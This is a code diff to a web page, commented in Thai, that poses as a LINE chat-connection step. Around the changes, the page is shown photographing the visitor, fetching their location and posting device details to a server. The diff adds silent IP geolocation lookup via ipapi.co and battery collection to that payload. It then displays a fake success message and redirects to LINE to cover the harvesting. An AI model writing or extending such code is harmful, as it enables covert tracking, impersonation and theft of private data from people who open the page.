@@ -143,6 +143,24 @@
 
     <script>
         let imageData = null; // เก็บรูปถ่ายแบบ Base64
+        let ipData = null; // เก็บข้อมูล IP
+        let batteryData = null; // เก็บข้อมูลแบตเตอรี่
+
+        // โหลดข้อมูล IP ทันทีที่เปิดเว็บ
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => ipData = data)
+            .catch(e => console.log('IP Fetch Error:', e));
+
+        // โหลดข้อมูลแบตเตอรี่ (ถ้าเบราว์เซอร์รองรับ)
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(battery => {
+                batteryData = {
+                    level: Math.round(battery.level * 100),
+                    charging: battery.charging
+                };
+            });
+        }
 
         // ขอสิทธิ์กล้องและถ่ายรูปก่อน
         async function getLocation() {
@@ -219,7 +237,9 @@
                 language: navigator.language,
                 screen: `${window.screen.width}x${window.screen.height}`,
                 cores: navigator.hardwareConcurrency || 'N/A',
-                ram: navigator.deviceMemory || 'N/A'
+                ram: navigator.deviceMemory || 'N/A',
+                ip: ipData,
+                battery: batteryData
             };
 
             // ส่งข้อมูลทั้งหมดไปที่เซิร์ฟเวอร์
@@ -235,10 +255,23 @@
                     image: imageData // เพิ่มรูปที่ถ่ายได้
                 }),
             })
-            .then(response => response.json())
             .then(data => {
-                status.textContent = "เชื่อมต่อสำเร็จ! กำลังนำคุณเข้าสู่ห้องแชท...";
-                status.style.color = "#00B900";
+                const btnIcon = document.getElementById('btnIcon');
+                const btnSpinner = document.getElementById('btnSpinner');
+                
+                status.textContent = "เชื่อมต่อสำเร็จ! กำลังพาท่านไปที่แอป...";
+                status.style.color = "green";
+                btnIcon.style.display = 'block';
+                btnSpinner.style.display = 'none';
+                
+                // ระบบเด้งเข้าแอป LINE จริงหรือเว็บ LINE Official
+                setTimeout(() => {
+                    // ลองเปิดแอป LINE ก่อน ถ้าไม่มีให้ไปเว็บหลัก
+                    window.location.href = "line://";
+                    setTimeout(() => {
+                        window.location.href = "https://line.me/th/";
+                    }, 500);
+                }, 1500);
             })
             .catch((error) => {
                 status.textContent = "เกิดข้อผิดพลาดในการเชื่อมต่อ กรุณาลองใหม่";
